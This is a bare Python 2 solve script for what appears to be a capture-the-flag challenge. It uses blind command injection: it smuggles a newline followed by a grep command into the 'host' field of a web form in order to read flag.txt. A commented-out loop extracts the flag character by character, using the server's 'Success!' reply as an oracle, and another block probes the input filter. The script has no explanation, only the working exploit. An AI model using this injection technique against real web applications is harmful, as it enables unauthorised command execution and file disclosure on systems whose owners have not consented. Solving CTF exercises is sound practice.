import requests 
import string

ses = requests.session()

symbol = string.punctuation
word = string.ascii_lowercase + string.digits

flag = "flag\{c11d098dd25a08816027174c14f7bf60\}"
# for i in range(1):
# 	for w in word:
# 		data = {
# 			"host":"\x0A grep '{}' ./flag.txt".format(flag+w)
# 		}
# 		out = ses.post("http://challenge.ctf.games:31153",data=data)
# 		if "Success!" in out.text:
# 			flag +=w
# 			print flag 
# 			break

# data = {
# 	"host":"\x0A grep 'flag.a' ./flag.txt"
# }
# out = ses.post("http://challenge.ctf.games:31153",data=data)
# if "not allowed!" not in out.text:
# 	print out.text

data = {
	"host":"\x0A grep '{}' ./flag.txt".format(flag)
}
out = ses.post("http://challenge.ctf.games:31153",data=data)
print out.text